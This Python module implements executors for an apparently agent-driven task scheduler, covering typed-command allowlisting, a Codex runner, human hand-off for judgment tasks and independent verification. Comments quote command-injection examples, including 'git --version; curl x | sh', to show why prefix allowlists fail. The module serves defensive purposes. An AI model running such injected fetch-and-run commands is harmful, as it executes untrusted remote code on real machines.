#!/usr/bin/env python3
"""executors — real cores behind the scheduler's Executor interface.

`SimExecutor` (in scheduler.py) fakes work for dry runs. These are the real ones:

  * `ShellExecutor` — runs a task's `acceptance` shell command; ok = exit 0. Model-free and
    fully local, so it drives `test`/`run` tasks today (including Qwen-backed evals invoked as
    commands). This is the executor that can run right now in any environment.
  * `CodexExecutor` — shells out to `codex exec` for `impl` tasks. Requires the `codex` binary on
    PATH with auto-approve configured (`~/.codex/config.toml`). Real, but only where Codex is
    reachable — the machine's own shells, not necessarily a sandboxed sub-process elsewhere.
  * `RoutingExecutor` — routes each task to the right core by tier/op, and raises `NeedsHuman`
    for `verdict`/`fable` tasks so the loop hands judgment back (the human/Fable interrupt).

Every `execute` returns `(ok: bool, result: str, cost: float)` — the same contract as SimExecutor.
For real executors, `cost` is measured wall-clock execution time in seconds and includes any
post-implementation acceptance command.
"""

from __future__ import annotations

import subprocess
import time
from pathlib import Path
from typing import Any, Callable


SHELL_CONTROL_TOKENS = frozenset({"&", "&&", "|", "||", ">", ">>", "<", "<<"})


class NeedsHuman(Exception):
    """The task requires Fable/human judgment (a verdict) and cannot be auto-executed."""


class CommandRejected(Exception):
    """A typed command violates the configured deterministic execution policy."""


class CommandPolicy:
    """Allow typed argv commands by prefix while rejecting shell-control tokens."""

    def __init__(self, allowed_prefixes: list[list[str]] | None = None) -> None:
        self.allowed_prefixes = [self._canonical(prefix) for prefix in (allowed_prefixes or [])]
        if any(not prefix for prefix in self.allowed_prefixes):
            raise ValueError("command prefixes must be non-empty")

    @staticmethod
    def _canonical(argv: list[str]) -> tuple[str, ...]:
        if not isinstance(argv, list) or not argv or not all(isinstance(value, str) and value for value in argv):
            raise CommandRejected("command must be a non-empty list of non-empty strings")
        return (Path(argv[0]).name.casefold(), *argv[1:])

    def validate(self, argv: list[str]) -> list[str]:
        canonical = self._canonical(argv)
        for value in argv:
            if "\x00" in value or "\n" in value or "\r" in value:
                raise CommandRejected("command contains a forbidden control character")
            if value in SHELL_CONTROL_TOKENS:
                raise CommandRejected(f"shell control token is forbidden in typed command: {value}")
        if not any(canonical[: len(prefix)] == prefix for prefix in self.allowed_prefixes):
            raise CommandRejected("command prefix is not allowlisted")
        return list(argv)


def _tail(text: str, n: int = 3) -> str:
    lines = [ln for ln in text.strip().splitlines() if ln.strip()]
    return " / ".join(lines[-n:]) if lines else ""


def _typed_argv(command: Any, policy: CommandPolicy | None) -> list[str]:
    if policy is not None:
        return policy.validate(command)
    CommandPolicy._canonical(command)
    return list(command)


def _typed_argv_sequence(commands: Any, policy: CommandPolicy | None) -> list[list[str]]:
    """Validate a `commands` sequence: several typed argvs, run in order, all must pass.

    This exists so the safe path can express what tasks actually need. `command` holds a
    single argv, so `a && b` had no typed form and authors reached for an `acceptance`
    shell string instead — which is why the unsafe path outlived the benchmark that
    condemned it (`command_policy_benchmark_v1.py`: the legacy prefix allowlist lets
    `git --version & echo injected>x` through; the typed policy blocks it). An unsafe
    path survives while the safe one cannot do the job.
    """
    if not isinstance(commands, list) or not commands:
        raise CommandRejected("commands must be a non-empty list of argv lists")
    return [_typed_argv(entry, policy) for entry in commands]


class ShellExecutor:
    """Run a task's acceptance check. ok = exit 0. No model, fully local.

    Three forms, in precedence order:
      * ``commands`` — several typed argvs run in sequence; all must pass (the safe `&&`).
      * ``command``  — one typed argv.
      * ``acceptance`` — a legacy shell string. Unvalidatable and off by default; see
        ``allow_legacy_shell``.
    """

    def __init__(
        self,
        cwd: str | Path,
        *,
        timeout: int = 600,
        allowlist: list[str] | None = None,
        command_policy: CommandPolicy | None = None,
        allow_legacy_shell: bool = False,
        clock: Callable[[], float] = time.perf_counter,
    ) -> None:
        self.cwd = str(cwd)
        self.timeout = timeout
        # NOTE: `allowlist` filters legacy shell strings by prefix only. It is a convenience
        # filter, NOT a security boundary: the string still reaches `shell=True`, so
        # "git --version; curl x | sh" passes a ["git --version"] allowlist. This is measured,
        # not theorised — see command_policy_benchmark_v1.py. Use `command_policy` + typed
        # `command`/`commands` for anything a model can populate.
        self.allowlist = allowlist
        self.command_policy = command_policy
        self.allow_legacy_shell = allow_legacy_shell
        self.clock = clock

    def _run_sequence(self, argvs: list[list[str]]) -> tuple[bool, str, float]:
        started = self.clock()
        outputs = []
        for argv in argvs:
            try:
                proc = subprocess.run(
                    argv, cwd=self.cwd, capture_output=True, text=True, timeout=self.timeout
                )
            except FileNotFoundError:
                return False, f"command not found: {argv[0]}", max(self.clock() - started, 0.0)
            except subprocess.TimeoutExpired:
                return False, f"timeout after {self.timeout}s", max(self.clock() - started, 0.0)
            outputs.append(f"exit {proc.returncode}: {_tail(proc.stdout + proc.stderr)}")
            if proc.returncode != 0:
                # Same short-circuit as `&&`: a failing step stops the chain.
                return False, " | ".join(outputs), max(self.clock() - started, 0.0)
        return True, " | ".join(outputs), max(self.clock() - started, 0.0)

    def execute(self, task: dict[str, Any]) -> tuple[bool, str, float]:
        commands = task.get("commands")
        if commands is not None:
            try:
                argvs = _typed_argv_sequence(commands, self.command_policy)
            except CommandRejected as exc:
                return False, f"blocked: {exc}", 0.0
            return self._run_sequence(argvs)
        command = task.get("command")
        if command is not None:
            try:
                argv = _typed_argv(command, self.command_policy)
            except CommandRejected as exc:
                return False, f"blocked: {exc}", 0.0
            started = self.clock()
            try:
                proc = subprocess.run(
                    argv, cwd=self.cwd, capture_output=True, text=True, timeout=self.timeout
                )
            except FileNotFoundError:
                return False, f"command not found: {argv[0]}", max(self.clock() - started, 0.0)
            except subprocess.TimeoutExpired:
                return False, f"timeout after {self.timeout}s", max(self.clock() - started, 0.0)
            ok = proc.returncode == 0
            return ok, f"exit {proc.returncode}: {_tail(proc.stdout + proc.stderr)}", max(self.clock() - started, 0.0)

        cmd = task.get("acceptance") or ""
        if not cmd:
            return False, "no acceptance command or typed command to run", 0.0
        if not self.allow_legacy_shell:
            return False, "blocked: legacy shell execution is disabled", 0.0
        if self.allowlist is not None:
            stripped = cmd.strip()
            if not any(stripped.startswith(prefix) for prefix in self.allowlist):
                return False, "blocked: command not allowlisted", 0.0
        started = self.clock()
        try:
            proc = subprocess.run(
                cmd, shell=True, cwd=self.cwd, capture_output=True, text=True, timeout=self.timeout
            )
        except subprocess.TimeoutExpired:
            return False, f"timeout after {self.timeout}s", max(self.clock() - started, 0.0)
        ok = proc.returncode == 0
        return ok, f"exit {proc.returncode}: {_tail(proc.stdout + proc.stderr)}", max(self.clock() - started, 0.0)


class CodexExecutor:
    """Drive `codex exec` for an impl task. Requires codex on PATH + auto-approve configured."""

    def __init__(
        self,
        cwd: str | Path,
        *,
        codex: str = "codex",
        extra_args: list[str] | None = None,
        timeout: int = 1800,
        command_policy: CommandPolicy | None = None,
        allow_legacy_shell: bool = False,
        clock: Callable[[], float] = time.perf_counter,
    ) -> None:
        self.cwd = str(cwd)
        self.codex = codex
        self.extra_args = extra_args or []  # e.g. ["--full-auto"] or sandbox flags
        self.timeout = timeout
        self.command_policy = command_policy
        self.allow_legacy_shell = allow_legacy_shell
        self.clock = clock

    def execute(self, task: dict[str, Any]) -> tuple[bool, str, float]:
        prompt = task.get("spec") or task.get("title") or ""
        retry_feedback = task.get("retry_feedback")
        if isinstance(retry_feedback, str) and retry_feedback:
            prompt = (
                f"{prompt}\n\n"
                f"Bounded repair attempt {int(task.get('attempt', 0))}. "
                "Inspect the existing workspace and correct the prior attempt against "
                "the original acceptance criteria. Independent review feedback:\n"
                f"{retry_feedback}"
            )
        cmd = [self.codex, "exec", *self.extra_args, prompt]
        started = self.clock()
        try:
            proc = subprocess.run(cmd, cwd=self.cwd, capture_output=True, text=True, timeout=self.timeout)
        except FileNotFoundError:
            return False, f"codex binary '{self.codex}' not found on PATH", max(self.clock() - started, 0.0)
        except subprocess.TimeoutExpired:
            return False, f"codex exec timeout after {self.timeout}s", max(self.clock() - started, 0.0)
        ok = proc.returncode == 0
        # If the task carries an acceptance check, the code must also pass it.
        commands = task.get("commands")
        command = task.get("command")
        acceptance = task.get("acceptance")
        if ok and commands is not None:
            try:
                argvs = _typed_argv_sequence(commands, self.command_policy)
            except CommandRejected as exc:
                return False, f"codex exit 0; acceptance blocked: {exc}", max(self.clock() - started, 0.0)
            seq_ok, seq_result, _ = ShellExecutor(
                self.cwd, timeout=self.timeout, command_policy=self.command_policy, clock=self.clock
            )._run_sequence(argvs)
            return seq_ok, f"codex exit 0; acceptance {seq_result}", max(self.clock() - started, 0.0)
        if ok and command is not None:
            try:
                argv = _typed_argv(command, self.command_policy)
            except CommandRejected as exc:
                return False, f"codex exit 0; acceptance blocked: {exc}", max(self.clock() - started, 0.0)
            try:
                check = subprocess.run(argv, cwd=self.cwd, capture_output=True, text=True, timeout=self.timeout)
            except FileNotFoundError:
                return False, f"codex exit 0; acceptance command not found: {argv[0]}", max(self.clock() - started, 0.0)
            except subprocess.TimeoutExpired:
                return False, f"codex exit 0; acceptance timeout after {self.timeout}s", max(self.clock() - started, 0.0)
            ok = check.returncode == 0
            return (
                ok,
                f"codex exit 0; acceptance exit {check.returncode}: {_tail(check.stdout + check.stderr)}",
                max(self.clock() - started, 0.0),
            )
        if ok and acceptance:
            if not self.allow_legacy_shell:
                return False, "codex exit 0; acceptance blocked: legacy shell execution is disabled", max(self.clock() - started, 0.0)
            check = subprocess.run(acceptance, shell=True, cwd=self.cwd, capture_output=True, text=True)
            ok = check.returncode == 0
            return (
                ok,
                f"codex exit 0; acceptance exit {check.returncode}: {_tail(check.stdout + check.stderr)}",
                max(self.clock() - started, 0.0),
            )
        return ok, f"codex exit {proc.returncode}: {_tail(proc.stdout + proc.stderr)}", max(self.clock() - started, 0.0)


class RoutingExecutor:
    """Route each task to the right core; verdict/fable tasks return to the human (NeedsHuman)."""

    def __init__(self, *, shell: ShellExecutor, codex: CodexExecutor | None = None) -> None:
        self.shell = shell
        self.codex = codex

    def execute(self, task: dict[str, Any]) -> tuple[bool, str, float]:
        if task["op"] == "verdict" or task["tier"] == "fable":
            raise NeedsHuman(task["id"])                 # judgment is Fable's; hand it back
        if task["tier"] == "codex" and task["op"] == "impl":
            if self.codex is None:
                raise NeedsHuman(task["id"])             # no Codex core reachable here
            return self.codex.execute(task)
        return self.shell.execute(task)                  # test/run/impl on shell-runnable cores


class ExecutorVerifier:
    """Independently re-execute a task's acceptance path before board review.

    The verifier is intentionally a separate object with an explicit reviewer
    identity. It may wrap a shell executor for deterministic tests or a
    different model-family executor for semantic review. The producer's result
    is evidence only; it is never reused as the review outcome.
    """

    def __init__(self, executor: Any, *, reviewer: str) -> None:
        if not reviewer:
            raise ValueError("reviewer must be non-empty")
        self.executor = executor
        self.reviewer = reviewer

    def verify(
        self,
        task: dict[str, Any],
        *,
        producer_ok: bool,
        producer_result: str,
    ) -> tuple[bool, str, float]:
        review_task = dict(task)
        review_task["op"] = "review"
        review_task["title"] = f"Independent review: {task.get('title', task.get('id', 'task'))}"
        review_task["producer_result"] = producer_result
        review_task["spec"] = (
            "Independently verify the task against its acceptance criteria. "
            "Do not trust the producer result; reproduce the check.\n\n"
            f"Original specification:\n{task.get('spec', '')}\n\n"
            f"Producer report (untrusted evidence):\n{producer_result}"
        )
        review_ok, review_result, cost = self.executor.execute(review_task)
        ok = bool(producer_ok and review_ok)
        note = (
            f"producer {'OK' if producer_ok else 'FAIL'}; "
            f"independent verification {'OK' if review_ok else 'FAIL'}: {review_result}"
        )
        return ok, note, cost
